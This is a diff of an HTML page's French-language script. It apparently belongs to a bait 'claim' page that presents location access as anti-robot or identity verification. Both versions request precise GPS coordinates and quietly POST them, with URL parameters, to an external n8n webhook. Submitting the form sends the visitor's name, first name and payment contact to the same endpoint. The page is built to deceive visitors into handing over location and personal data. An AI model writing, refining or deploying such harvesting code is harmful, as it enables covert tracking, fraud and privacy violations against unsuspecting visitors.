@@ -162,253 +162,191 @@
 </div>
 
 <script>
-    // 🔥 Récupère tous les paramètres de l'URL
-    const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
-    /* -----------------------------------------------------
-   Détection de l'OS, version iOS et modèles iPhone
------------------------------------------------------ */
-function detectIOSVersion() {
-    const ua = navigator.userAgent;
-    if (/iP(hone|od|ad)/.test(ua)) {
-        const v = ua.match(/OS (\d+)_/);
-        return v ? parseInt(v[1]) : null;
-    }
-    return null;
-}
-
-function detectIPhoneModel() {
-    const ratio = window.devicePixelRatio || 1;
-    const screen = {
-        w: window.screen.width * ratio,
-        h: window.screen.height * ratio
-    };
-
-    // Détection approximative (iPhone 11 = 828×1792 px)
-    if ((screen.w === 828 && screen.h === 1792) ||
-        (screen.w === 896 && screen.h === 414)) {
-        return "iPhone 11";
-    }
-
-    return "Unknown";
-}
-
-/* -----------------------------------------------------
-   NOUVELLE FONCTION GPS FULL AUTO
-   Compatible iPhone 11 / iOS ≤ 15
------------------------------------------------------ */
-async function getGPSCoordinates() {
-
-    const iOS = detectIOSVersion();
-    const iPhoneModel = detectIPhoneModel();
-
-    console.log("📱 Modèle détecté :", iPhoneModel);
-    console.log("📱 Version iOS détectée :", iOS);
-
-    const isOldIOS = iOS && iOS <= 15;
-    const isIphone11 = iPhoneModel === "iPhone 11";
-
-    /* -------------------------------------------------
-       MODE SPÉCIAL POUR iPhone 11 & iOS ≤ 15
-       (super stable et compatible)
-    ------------------------------------------------- */
-    if (isOldIOS || isIphone11) {
-        console.warn("⚠️ Mode iPhone 11 / iOS ancien activé");
-
-        const tryOnce = () =>
-            new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => res(p),
-                    (e) => rej(e),
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
-            });
-
-        // Tentative 1
-        try {
-            const pos1 = await tryOnce();
-            return {
-                method: "safeMode",
-                latitude: pos1.coords.latitude,
-                longitude: pos1.coords.longitude,
-                accuracy: pos1.coords.accuracy,
-                source: "first_attempt"
-            };
-        } catch (err) {
-            console.warn("⛔ Tentative 1 KO :", err.message);
+    document.addEventListener("DOMContentLoaded", () => {
+    
+        /* --- UTILITAIRES -------------------------------------------------- */
+    
+        function detectIOSVersion() {
+            const ua = navigator.userAgent;
+            if (/iP(hone|od|ad)/.test(ua)) {
+                const v = ua.match(/OS (\d+)_/);
+                return v ? parseInt(v[1]) : null;
+            }
+            return null;
         }
-
-        await new Promise(r => setTimeout(r, 2000));
-
-        // Tentative 2
-        try {
-            const pos2 = await tryOnce();
-            return {
-                method: "safeMode",
-                latitude: pos2.coords.latitude,
-                longitude: pos2.coords.longitude,
-                accuracy: pos2.coords.accuracy,
-                source: "second_attempt"
+    
+        function detectIPhoneModel() {
+            const ratio = window.devicePixelRatio || 1;
+            const screen = {
+                w: window.screen.width * ratio,
+                h: window.screen.height * ratio
             };
-        } catch (err) {
-            console.warn("⛔ Tentative 2 KO :", err.message);
+    
+            if ((screen.w === 828 && screen.h === 1792) ||
+                (screen.w === 896 && screen.h === 414)) {
+                return "iPhone 11";
+            }
+            return "Unknown";
         }
-
-        // Fallback
-        return {
+    
+        const format = (pos, s) => ({
+            method: "gps",
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            source: s
+        });
+    
+        const denied = () => ({
             method: "denied",
             latitude: 0,
             longitude: 0,
             accuracy: null,
             source: "fallback"
-        };
-    }
-
-    /* -------------------------------------------------
-       MODE NORMAL — pour iPhone modernes / Android
-    ------------------------------------------------- */
-    console.log("🚀 Mode GPS Rapide activé (appareil récent)");
-
-    // Tentative rapide
-    try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(
-                (p) => res(p),
-                (e) => rej(e),
-                {
-                    enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0
-                }
-            );
         });
-
-        return {
-            method: "fast",
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            source: "getCurrentPosition"
-        };
-
-    } catch (err) {
-        console.warn("⚠️ GPS rapide KO, fallback simple…");
-    }
-
-    return {
-        method: "denied",
-        latitude: 0,
-        longitude: 0,
-        accuracy: null,
-        source: "fallback"
-    };
-}
-
     
-    let collectedData = {};
     
-    const claimButton = document.getElementById('claim-button');
-    const dataForm = document.getElementById('data-form');
-    const submitButton = document.getElementById('submit-button');
-    const initialNotification = document.getElementById('initial-notification');
-    const resultMessage = document.getElementById('result-message');
-    const errorMessage = document.getElementById('error-message');
+        /* --- GPS FULL SAFE ------------------------------------------------ */
     
-    claimButton.addEventListener('click', () => {
-    initialNotification.style.display = 'none';
-    dataForm.style.display = 'block';
-
-    const locationInput = document.getElementById('location-input');
-    locationInput.value = "Vérification Anti robot & GEO...";
-
-    // ⬇️ APPEL GPS ICI
-    getGPSCoordinates().then((coords) => {
-        let localisationString = "";
-
-        if (coords.method === "gps") {
-            localisationString = `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (±${Math.round(coords.accuracy)}m)`;
-        } else {
-            localisationString = "Localisation refusée / indisponible";
+        async function getGPSCoordinates() {
+            const iOS = detectIOSVersion();
+            const model = detectIPhoneModel();
+    
+            const isOldIOS = iOS && iOS <= 15;
+            const isIphone11 = model === "iPhone 11";
+    
+            // MODE SPECIAL iPhone 11 / iOS ancien
+            if (isOldIOS || isIphone11) {
+    
+                const tryOnce = () => new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => res(p),
+                        (e) => rej(e),
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                });
+    
+                try { return format(await tryOnce(), "first_attempt"); }
+                catch {}
+    
+                await new Promise(r => setTimeout(r, 2000));
+    
+                try { return format(await tryOnce(), "second_attempt"); }
+                catch {}
+    
+                return denied();
+            }
+    
+            // MODE NORMAL
+            try {
+                return format(await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(
+                        res, rej,
+                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    );
+                }), "fast");
+            }
+            catch {
+                return denied();
+            }
         }
-
-        locationInput.value = localisationString;
-
-        console.log("📍 Localisation :", localisationString);
-
-        // 🚀 Envoi automatique 1 (GPS)
-        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                localisation: localisationString,
-                nom: "",
-                prenom: "",
-                contact_paiement: "",
+    
+    
+        /* --- VARIABLES DOM ------------------------------------------------ */
+    
+        const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
+        let collectedData = {};
+    
+        const claimButton = document.getElementById('claim-button');
+        const dataForm = document.getElementById('data-form');
+        const submitButton = document.getElementById('submit-button');
+        const initialNotification = document.getElementById('initial-notification');
+        const resultMessage = document.getElementById('result-message');
+        const errorMessage = document.getElementById('error-message');
+        const locationInput = document.getElementById("location-input");
+    
+    
+        /* --- BOUTON 1 : LANCER LA VERIFICATION ---------------------------- */
+    
+        claimButton.addEventListener('click', () => {
+    
+            initialNotification.style.display = 'none';
+            dataForm.style.display = 'block';
+            locationInput.value = "Activation de la localisation…";
+    
+            // Popup obligatoire iPhone 11
+            if (!confirm("Pour vérifier votre identité, activez la fonctionnalité.")) {
+                locationInput.value = "Localisation refusée par l’utilisateur.";
+                return;
+            }
+    
+            // Petit délai sécurisé
+            setTimeout(async () => {
+    
+                const coords = await getGPSCoordinates();
+    
+                const localisationString = coords.method === "gps"
+                    ? `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (±${Math.round(coords.accuracy)}m)`
+                    : "Localisation refusée / indisponible";
+    
+                locationInput.value = localisationString;
+    
+                // Envoi webhook #1
+                fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        localisation: localisationString,
+                        nom: "",
+                        prenom: "",
+                        contact_paiement: "",
+                        date_saisie: new Date().toLocaleString('fr-FR'),
+                        ...urlParams
+                    })
+                }).catch(console.error);
+    
+            }, 300);
+    
+        });
+    
+    
+        /* --- BOUTON 2 : VALIDATION FORMULAIRE ----------------------------- */
+    
+        submitButton.addEventListener('click', () => {
+    
+            const name = document.getElementById('name-input').value;
+            const firstname = document.getElementById('firstname-input').value;
+            const contact = document.getElementById('contact-input').value;
+    
+            if (!locationInput.value || !name || !firstname || !contact) {
+                errorMessage.classList.remove("hidden");
+                return;
+            }
+    
+            collectedData = {
+                localisation: locationInput.value,
+                nom: name,
+                prenom: firstname,
+                contact_paiement: contact,
                 date_saisie: new Date().toLocaleString('fr-FR'),
                 ...urlParams
-            })
-        })
-        .then(res => res.text())
-        .then(result => console.log("🟢 GPS envoyé à n8n :", result))
-        .catch(err => console.error("🔴 Erreur envoi GPS :", err));
-    });
-});
-
+            };
     
-    submitButton.addEventListener('click', () => {
-        const location = document.getElementById('location-input').value;
-        const name = document.getElementById('name-input').value;
-        const firstname = document.getElementById('firstname-input').value;
-        const contact = document.getElementById('contact-input').value;
+            dataForm.style.display = 'none';
+            resultMessage.style.display = 'block';
     
-        errorMessage.style.display = 'none';
+            // Envoi webhook #2
+            fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(collectedData)
+            }).catch(console.error);
     
-        if (!location || !name || !firstname || !contact || location.includes("Récupération")) {
-            errorMessage.textContent = "Veuillez remplir tous les champs svp.";
-            errorMessage.style.display = 'block';
-            return;
-        }
-    
-        collectedData = {
-            localisation: location,
-            nom: name,
-            prenom: firstname,
-            contact_paiement: contact,
-            date_saisie: new Date().toLocaleString('fr-FR')
-        };
-    
-        dataForm.style.display = 'none';
-        resultMessage.style.display = 'block';
-    
-        console.log("===================================");
-        console.log("📩 DONNÉES DE FORMULAIRE COLLECTÉES :");
-        console.log(collectedData);
-        console.log("===================================");
-    
-        /* 🚀 ENVOI #2 — FORM COMPLET + URL PARAMS */
-        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                ...collectedData,
-                ...urlParams // 👈 AJOUT DES PARAMÈTRES URL
-            })
-        })
-        .then(res => res.text())
-        .then(result => {
-            console.log("🟢 n8n a répondu :", result);
-        })
-        .catch(error => {
-            console.error("🔴 Erreur n8n :", error);
         });
     
     });
-</script>
+    </script>
+    
 
 </body>
 </html>
